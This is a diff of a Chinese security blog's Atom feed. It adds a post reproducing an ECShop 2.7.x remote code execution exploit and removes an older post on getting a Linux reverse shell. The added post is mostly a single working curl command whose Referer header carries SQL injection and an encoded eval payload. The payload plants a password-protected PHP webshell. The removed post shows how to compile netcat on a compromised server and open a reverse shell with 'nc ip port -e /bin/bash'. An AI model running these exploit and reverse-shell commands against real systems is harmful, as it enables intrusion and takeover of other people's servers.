@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://sky666sec.github.io/"/>
-  <updated>2018-08-24T11:06:01.785Z</updated>
+  <updated>2018-09-02T14:28:48.149Z</updated>
   <id>https://sky666sec.github.io/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>ECShop &lt;= 2.7.x 全系列版本远程代码执行高危漏洞利用(复现)</title>
+    <link href="https://sky666sec.github.io/2018/09/02/2018-09-02-ECShop-%3C=-2.7.x-%E5%85%A8%E7%B3%BB%E5%88%97%E7%89%88%E6%9C%AC%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8(%E5%A4%8D%E7%8E%B0)/"/>
+    <id>https://sky666sec.github.io/2018/09/02/2018-09-02-ECShop-&lt;=-2.7.x-全系列版本远程代码执行高危漏洞利用(复现)/</id>
+    <published>2018-09-02T14:05:19.000Z</published>
+    <updated>2018-09-02T14:28:48.149Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/sky666sec/sky666sec.github.io/hexo/Figure%20Bed/ecshop.png" alt=""></p><a id="more"></a><h3 id="ECShop-lt-2-7-x-全系列版本远程代码执行高危漏洞利用"><a href="#ECShop-lt-2-7-x-全系列版本远程代码执行高危漏洞利用" class="headerlink" title="ECShop &lt;= 2.7.x 全系列版本远程代码执行高危漏洞利用"></a>ECShop &lt;= 2.7.x 全系列版本远程代码执行高危漏洞利用</h3><p><a href="https://www.vulnspy.com/cn-ecshop-2.7.x-rce-exploit/ecshop_%3C=_2.7.x_%E5%85%A8%E7%B3%BB%E5%88%97%E7%89%88%E6%9C%AC%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">https://www.vulnspy.com/cn-ecshop-2.7.x-rce-exploit/ecshop_%3C=_2.7.x_%E5%85%A8%E7%B3%BB%E5%88%97%E7%89%88%E6%9C%AC%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</a></p><p><strong>EXP：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://***.vsplate.me/user.php -d &apos;action=login&amp;vulnspy=phpinfo();exit;&apos; -H &apos;Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:3:&#123;s:2:&quot;id&quot;;s:3:&quot;&apos;&quot;&apos;&quot;&apos;/*&quot;;s:3:&quot;num&quot;;s:201:&quot;*/ union select 1,0x272F2A,3,4,5,6,7,8,0x7b247b2476756c6e737079275d3b6576616c2f2a2a2f286261736536345f6465636f646528275a585a686243676b5831425055315262646e5673626e4e77655630704f773d3d2729293b2f2f7d7d,0--&quot;;s:4:&quot;name&quot;;s:3:&quot;ads&quot;;&#125;554fcae493e564ee0dc75bdf2ebf94ca&apos;</span><br></pre></td></tr></table></figure><p><strong>成功获取webshell</strong></p><p>执行成功后会自动生成 <code>http://***.vsplate.me/vulnspy.php</code> 文件，密码为 <code>vulnspy</code>。</p><p>访问：<code>http://***.vsplate.me/vulnspy.php?vulnspy=phpinfo();</code></p><p><img src="https://raw.githubusercontent.com/sky666sec/sky666sec.github.io/hexo/Figure%20Bed/ecshop.png" alt=""></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/sky666sec/sky666sec.github.io/hexo/Figure%20Bed/ecshop.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="渗透测试" scheme="https://sky666sec.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    
+      <category term="渗透测试" scheme="https://sky666sec.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+  </entry>
   
   <entry>
     <title>Apache解析漏洞</title>
@@ -434,28 +456,6 @@
     
     
       <category term="渗透测试" scheme="https://sky666sec.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>记一次linux反弹shell</title>
-    <link href="https://sky666sec.github.io/2018/01/27/%E8%AE%B0%E4%B8%80%E6%AC%A1linux%E5%8F%8D%E5%BC%B9shell/"/>
-    <id>https://sky666sec.github.io/2018/01/27/记一次linux反弹shell/</id>
-    <published>2018-01-27T04:30:53.000Z</published>
-    <updated>2018-08-05T06:36:17.525Z</updated>
-    
-    <content type="html"><![CDATA[<p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fp83hz9p8dj30je08rwg2.jpg" alt=""></p><a id="more"></a><p>Linux 反弹shell,一直都有听说过，可惜自己不会。今天受xz指点，学会了。特记录一下。</p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53ly1fnv2976wsfj30md03zjr7.jpg" alt=""></p><p><code>root</code>权限，非常好，省得提权了。</p><p>由于Linux<code></code>我们在<code>webshell</code>里面是不好进行交互的，所以我们需要进行反弹<code>shell</code>操作。</p><p>首页我们通过<code>webshell</code>上传<code>nc</code>源码到<code>linux</code>服务器上</p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53ly1fnv2c7fxvbj30lf06e745.jpg" alt=""></p><p>然后我们进行解压、编译操作</p><p> <code>tar -zxvf /tmp/nc/netcat.tar.gz -C /tmp/nc</code></p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53ly1fnv2evqruxj30t50i50tb.jpg" alt=""></p><p>由于在webshell里面无法切换目录，而编译文件需要在源码目录下进行。<br>所以我们可以编写一个sh脚本，让它执行编译操作。</p><p><code>/tmp/nc/netcat-0.7.1/./configure --prefix=/tmp/nc/netcat/ &amp;&amp; make &amp;&amp; make install</code></p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53ly1fnv3drbz77j30hi0gj747.jpg" alt=""></p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53ly1fnv3ejo1y1j30hv07n746.jpg" alt=""></p><p>最后就是最重要的看点，<code>linux</code>反弹<code>shell</code>。</p><p>服务端执行如下命令：</p><pre><code>nc ip port -e /bin/bash</code></pre><p><img src="https://ws1.sinaimg.cn/large/006Y6f53ly1fnv3mcwt9ej30k1053wee.jpg" alt=""></p><p>攻击端进行监听：</p><pre><code>nc -lvvp 6666</code></pre><p><img src="https://ws1.sinaimg.cn/large/006Y6f53ly1fnv3mz4h1hj30gq03ojra.jpg" alt=""></p><p>反弹<code>shell</code>成功</p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fp83hz9p8dj30je08rwg2.jpg" alt=""></p><p><br><br><strong>总结</strong>：</p><ul><li>学会请教人，自己不会，但可以请教有经验的人把它学会。</li><li>方法很重要</li></ul>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;&lt;img src=&quot;https://ws1.sinaimg.cn/large/006Y6f53gy1fp83hz9p8dj30je08rwg2.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
-    
-    </summary>
-    
-      <category term="notes" scheme="https://sky666sec.github.io/categories/notes/"/>
-    
-    
-      <category term="notes" scheme="https://sky666sec.github.io/tags/notes/"/>
     
   </entry>
   
